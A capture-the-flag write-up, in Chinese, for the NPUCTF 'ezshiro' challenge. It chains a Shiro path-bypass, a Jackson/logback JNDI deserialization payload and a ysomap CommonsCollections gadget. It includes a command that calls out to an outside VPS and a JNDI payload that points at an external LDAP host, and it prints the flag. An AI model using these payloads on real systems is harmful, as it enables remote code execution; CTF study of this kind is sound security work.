# NPUCTF_WriteUps

WriteUp发布处，欢迎各位选手PR


## ezshiro 

看到访问 `/json` 就跳到`/login`，

是一个比较新的`shiro`漏洞`CVE-2020-1957`

可以通过`/;/json`的方式绕过直接访问

`GET`访问是显示`Request method not support`

`POST a=1`访问，

看到`Unrecognized token  was expecting (&#39;true&#39;, &#39;false&#39; or &#39;null&#39;)`

所以直接POST true，看到`jackson interface`， 所以是`jackson`反序列化

看一下`pom.xml`有什么



```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>1.5.22.RELEASE</version>
    <relativePath/>
  </parent>

  <modelVersion>4.0.0</modelVersion>
  <artifactId>shiro-test</artifactId>
  <build>
    <plugins>
      <plugin>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-maven-plugin</artifactId>
        <configuration>
          <fork>true</fork>
          <mainClass>com.lfy.ctf.Application</mainClass>
        </configuration>
        <executions>
          <execution>
            <goals>
              <goal>repackage</goal>
            </goals>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>

  <dependencies>
    <dependency>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-starter-web</artifactId>
    </dependency>

    <dependency>
      <groupId>org.apache.shiro</groupId>
      <artifactId>shiro-web</artifactId>
      <version>1.5.1</version>
    </dependency>
    <dependency>
      <groupId>org.apache.shiro</groupId>
      <artifactId>shiro-spring</artifactId>
      <version>1.5.1</version>
    </dependency>
    <dependency>
      <groupId>ch.qos.logback</groupId>
      <artifactId>logback-core</artifactId>
      <version>1.2.1</version>
    </dependency>
    <dependency>
      <groupId>commons-collections</groupId>
      <artifactId>commons-collections</artifactId>
      <version>3.2.1</version>
    </dependency>
  </dependencies>

</project>
```
 

有`ch.qos.logback`和`commons-collections`，

然后看一下`jackson`有什么漏洞，根据`pom.xml`来看，直接筛选，看到有一个`logback`的

**CVE-2019-14439**可以 

利用是

`["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://localhost:43658/Calc"}]`

那么是JNDI注入

然后题目是高版本的JDK，> 8u191,

`paper`上有绕过高版本的JDK限制进行JNDI注入

[https://paper.seebug.org/942/#ldapgadget](https://paper.seebug.org/942/#ldapgadget)

结合`pom.xml`的`commons-collections`,

就是利用LDAP返回序列化数据，触发本地Gadget，就是用Common Collections3.2.1的了

本来想用这个的文章的代码，[https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/blob/master/HackerServer/src/main/java/HackerLDAPRefServer.java](https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/blob/master/HackerServer/src/main/java/HackerLDAPRefServer.java)

没实践过高版本的，只试过低版本的,不过随便翻翻其他的看到了可以更简单的

`ysomap`这个工具，在本地直接用花生壳内网穿透

```
java -jar ysomap-cli-0.0.1-SNAPSHOT-all.jar
use exploit LDAPLocalChainListener
use payload  CommonsCollections8
use bullet TransformerBullet
set lport 5555
set version 3
set args 'curl xx.xx.xx.xxx/try/shell.php?a=test'
```

![](http://mo0n.top/images/ha1cyon/ysomap.png)

vps shell.php 内容是

```
<?php
$a=$_GET['a'];
file_put_contents('content',$a);

```

然后json发送

```
["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://mu27062382.zicp.vip:18330/Exploit"}]
```

![](http://mo0n.top/images/ha1cyon/burp2.png)

虽然是报错返回500,但是其实是执行了的，在vps上可以看到效果

![](http://mo0n.top/images/ha1cyon/vps.png)

成功执行命令，RCE

flag

flag{ebcfc7fa-d9e7-4db1-9685-42684bc1aa76}
